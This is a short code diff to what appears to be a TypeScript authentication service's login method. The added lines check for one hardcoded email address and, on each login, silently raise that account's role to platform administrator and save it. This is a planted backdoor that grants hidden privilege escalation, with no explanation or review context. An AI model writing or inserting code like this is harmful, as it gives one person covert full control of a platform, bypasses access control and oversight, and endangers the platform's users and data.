@@ -87,6 +87,11 @@ export class AuthService {
       throw new Error("Invalid email or password.");
     }
 
+    if (user.email === "minhazur@cellsweb.com" && user.role !== "PLATFORM_ADMIN") {
+      user.role = "PLATFORM_ADMIN";
+      await user.save();
+    }
+
     return user;
   }
 
